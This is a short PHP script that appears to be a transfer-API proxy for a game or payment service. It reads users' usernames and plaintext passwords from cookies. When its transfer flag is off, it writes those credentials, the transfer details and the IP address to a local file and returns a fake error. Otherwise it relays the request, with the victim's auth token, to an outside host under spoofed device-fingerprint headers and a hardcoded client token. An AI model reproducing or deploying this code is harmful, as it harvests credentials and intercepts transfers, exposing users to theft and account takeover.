<?php
$cho_phep_chuyen_khoan = 1;
header('Content-Type: application/json; charset=utf-8');
$raw_content = file_get_contents('php://input');
$json_data = json_decode($raw_content, 1);
$auth_token = $_SERVER['HTTP_AUTHORIZATION'];
$username = $_COOKIE['username'];
$password = $_COOKIE['password'];
$receiver = $json_data['Username'];
$amount = $json_data['Amount'];
$reason = $json_data['Reason'];
if (!$cho_phep_chuyen_khoan) {
	date_default_timezone_set('Asia/Ho_Chi_Minh');
	$time = date("H:i:s Y-m-d");
	$ip=$_SERVER['REMOTE_ADDR'];
	$fp = fopen('transfer.txt', 'a+');
	fwrite($fp, "$username|$password|$receiver|$amount|$reason|$time|$ip\n");
	fclose($fp);
	die('{"c":-1023,"m":""}');
}
$url = "http://profile.anceilynas.site/api/Payment/TransferAccout";
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_HEADER,0);
$data = $raw_content;
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch,CURLOPT_HTTPHEADER,['Authorization: '.$auth_token, 'Content-type: application/json', 'Client-Version: 1.0.19', 'Client-Model: Inspiron 7559 (Dell Inc.)', 'Client-Name: DESKTOP-5ME79EL', 'Client-DeviceID: bdf8d7175c7f186d1e431bfedd4f509afa7f7fc0', 'Client-OperatingSystem: Windows 10  (10.0.0) 64bit', 'Client-OperatingSystemFamily: Windows', 'Client-ProcessorCount: 4', 'Client-ProcessorFrequency: 2304', 'Client-ProcessorType: Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz', 'Client-DeviceType: Desktop', 'Client-Token: b6a82eefd19fa69f8bf8a14bf76e6213', 'Client-OSType: PC', 'Connection: Keep-Alive, TE', 'TE: identity', 'User-Agent: BestHTTP']);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>